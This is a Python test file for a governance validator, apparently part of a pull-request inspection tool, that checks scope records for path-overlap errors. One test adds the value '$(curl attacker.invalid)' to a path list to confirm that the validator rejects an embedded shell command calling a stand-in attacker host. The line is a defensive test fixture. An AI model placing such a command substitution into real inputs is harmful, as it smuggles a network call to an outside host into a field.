from __future__ import annotations

import json
from pathlib import Path

from pr_inspector.aigov_validation import (
    canonical_scope_digest,
    validate_aigov_contract,
)


ROOT = Path(__file__).resolve().parents[1]
VALID = ROOT / "tests/fixtures/aigov/v2.5.0/schema_valid"


def _scope_fixture() -> dict:
    value = json.loads((VALID / "scope_record.json").read_text(encoding="utf-8"))
    assert isinstance(value, dict)
    return value


def test_executable_expression_inside_string_list_is_rejected() -> None:
    payload = _scope_fixture()
    payload["included_paths"].append("$(curl attacker.invalid)")
    payload["scope_digest"] = canonical_scope_digest(payload)

    codes = {
        item.code for item in validate_aigov_contract("scope_record", payload)
    }
    assert "AIGOV-SEM-006" in codes


def test_directory_wildcard_does_not_overlap_similar_sibling_prefix() -> None:
    payload = _scope_fixture()
    payload["included_paths"] = ["foo/**"]
    payload["excluded_paths"] = ["foobar/file.py"]
    payload["scope_authority_binding_refs"] = [
        {
            "record_type": "obligation_authority_binding",
            "record_id": "scope-authority-prefix-test",
            "record_digest": "sha256:" + "6" * 64,
        }
    ]
    payload["scope_digest"] = canonical_scope_digest(payload)

    assert validate_aigov_contract("scope_record", payload) == ()


def test_directory_wildcard_still_detects_true_descendant_overlap() -> None:
    payload = _scope_fixture()
    payload["included_paths"] = ["foo/**"]
    payload["excluded_paths"] = ["foo/private/file.py"]
    payload["scope_authority_binding_refs"] = [
        {
            "record_type": "obligation_authority_binding",
            "record_id": "scope-authority-overlap-test",
            "record_digest": "sha256:" + "5" * 64,
        }
    ]
    payload["scope_digest"] = canonical_scope_digest(payload)

    codes = {
        item.code for item in validate_aigov_contract("scope_record", payload)
    }
    assert "AIGOV-SEM-144" in codes
